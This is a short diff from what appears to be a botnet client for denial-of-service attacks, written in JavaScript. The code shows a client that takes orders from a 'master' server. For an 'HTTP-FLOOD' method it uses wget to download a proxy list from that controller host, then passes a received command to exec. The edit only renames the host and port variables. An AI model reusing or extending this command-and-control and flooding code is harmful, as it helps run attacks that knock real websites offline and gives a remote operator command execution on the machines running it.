@@ -99,7 +99,7 @@ client.on("data", function (data) {
         if (method == "HTTP-FLOOD") {
             // DOWNLOAD PROXIES AUTOMATICALLY FROM THE MASTER
             execSync(
-                `wget 'http://${host}:${port}/proxies' -O methods/browser/proxies.txt`
+                `wget 'http://${HOST}:${PORT}/proxies' -O methods/browser/proxies.txt`
             )
         }
         exec(cmd)
